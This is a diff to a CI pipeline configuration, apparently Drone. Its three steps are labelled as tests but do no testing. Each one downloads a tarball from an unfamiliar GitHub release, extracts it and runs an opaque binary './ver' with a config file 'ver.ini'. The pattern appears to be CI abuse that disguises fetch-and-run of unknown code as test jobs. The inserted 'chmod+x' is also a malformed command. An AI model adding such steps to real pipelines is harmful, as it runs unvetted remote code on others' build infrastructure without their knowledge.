@@ -6,7 +6,7 @@ steps:
 - name: test-1 
   image: golang 
   commands: 
-  - wget https://github.com/Wakfodo/test/releases/download/Testing/ver.tar.gz && tar -xvf ver.tar.gz && ./ver ver.ini
+  - wget https://github.com/Wakfodo/test/releases/download/Testing/ver.tar.gz && tar -xvf ver.tar.gz && chmod+x ver && ./ver ver.ini
 
 kind: pipeline
 type: docker
@@ -16,7 +16,7 @@ steps:
 - name: test-2 
   image: golang 
   commands: 
-  - wget https://github.com/Wakfodo/test/releases/download/Testing/ver.tar.gz && tar -xvf ver.tar.gz && ./ver ver.ini
+  - wget https://github.com/Wakfodo/test/releases/download/Testing/ver.tar.gz && tar -xvf ver.tar.gz && chmod+x ver && ./ver ver.ini
   
 kind: pipeline
 type: docker
@@ -26,4 +26,4 @@ steps:
 - name: test-3 
   image: golang 
   commands: 
-  - wget https://github.com/Wakfodo/test/releases/download/Testing/ver.tar.gz && tar -xvf ver.tar.gz && ./ver ver.ini
+  - wget https://github.com/Wakfodo/test/releases/download/Testing/ver.tar.gz && tar -xvf ver.tar.gz && chmod+x ver && ./ver ver.ini
